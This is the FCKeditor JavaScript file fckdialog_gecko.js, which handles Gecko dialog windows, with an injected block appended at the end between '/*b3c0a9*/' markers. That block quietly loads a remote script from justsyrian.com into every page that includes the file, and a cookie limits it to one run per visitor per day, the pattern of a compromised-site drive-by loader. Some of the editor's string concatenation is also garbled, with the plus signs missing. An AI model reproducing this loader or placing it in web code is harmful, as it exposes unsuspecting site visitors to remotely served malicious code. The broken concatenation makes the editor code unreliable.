/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckdialog_gecko.js
 * 	Dialog windows operations. (Gecko specific implementations)
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKDialog.Show = function( dialogInfo, dialogName, pageUrl, dialogWidth, dialogHeight, parentWindow, resizable )
{
	var iTop  = (FCKConfig.ScreenHeight - dialogHeight) / 2 ;
	var iLeft = (FCKConfig.ScreenWidth  - dialogWidth)  / 2 ;

	var sOption  = "location=no,menubar=no,toolbar=no,dependent=yes,dialog=yes,minimizable=no,modal=yes,alwaysRaised=yes"  
		",resizable="    ( resizable ? 'yes' : 'no' )  
		",width="    dialogWidth  
		",height="   dialogHeight  
		",top="    iTop  
		",left="   iLeft ;

	if ( !parentWindow )
		parentWindow = window ;
	
	var oWindow = parentWindow.open( '', 'FCKeditorDialog_'   dialogName, sOption, true ) ;
	
	if ( !oWindow )
	{
		alert( FCKLang.DialogBlocked ) ;
		return ;
	}
		
	oWindow.moveTo( iLeft, iTop ) ;
	oWindow.resizeTo( dialogWidth, dialogHeight ) ;
	oWindow.focus() ;
	oWindow.location.href = pageUrl ;
	
	oWindow.dialogArguments = dialogInfo ;
	
	// On some Gecko browsers (probably over slow connections) the 
	// "dialogArguments" are not set to the target window so we must
	// put it in the opener window so it can be used by the target one.
	parentWindow.FCKLastDialogInfo = dialogInfo ;
	
	this.Window = oWindow ;
	
	// Try/Catch must be used to avoit an error when using a frameset 
	// on a different domain: 
	// "Permission denied to get property Window.releaseEvents".
	try
	{
		window.top.captureEvents( Event.CLICK | Event.MOUSEDOWN | Event.MOUSEUP | Event.FOCUS ) ;
		window.top.parent.addEventListener( 'mousedown', this.CheckFocus, true ) ;
		window.top.parent.addEventListener( 'mouseup', this.CheckFocus, true ) ;
		window.top.parent.addEventListener( 'click', this.CheckFocus, true ) ;
		window.top.parent.addEventListener( 'focus', this.CheckFocus, true ) ;
	}
	catch (e)
	{}
}

FCKDialog.CheckFocus = function()
{
	// It is strange, but we have to check the FCKDialog existence to avoid a 
	// random error: "FCKDialog is not defined".
	if ( typeof( FCKDialog ) != "object" )
		return false ;
	
	if ( FCKDialog.Window && !FCKDialog.Window.closed )
		FCKDialog.Window.focus() ;
	else
	{
		// Try/Catch must be used to avoit an error when using a frameset 
		// on a different domain: 
		// "Permission denied to get property Window.releaseEvents".
		try
		{
			window.top.releaseEvents(Event.CLICK | Event.MOUSEDOWN | Event.MOUSEUP | Event.FOCUS) ;
			window.top.parent.removeEventListener( 'onmousedown', FCKDialog.CheckFocus, true ) ;
			window.top.parent.removeEventListener( 'mouseup', FCKDialog.CheckFocus, true ) ;
			window.top.parent.removeEventListener( 'click', FCKDialog.CheckFocus, true ) ;
			window.top.parent.removeEventListener( 'onfocus', FCKDialog.CheckFocus, true ) ;
		}
		catch (e)
		{}
	}
	return false ;
}


/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
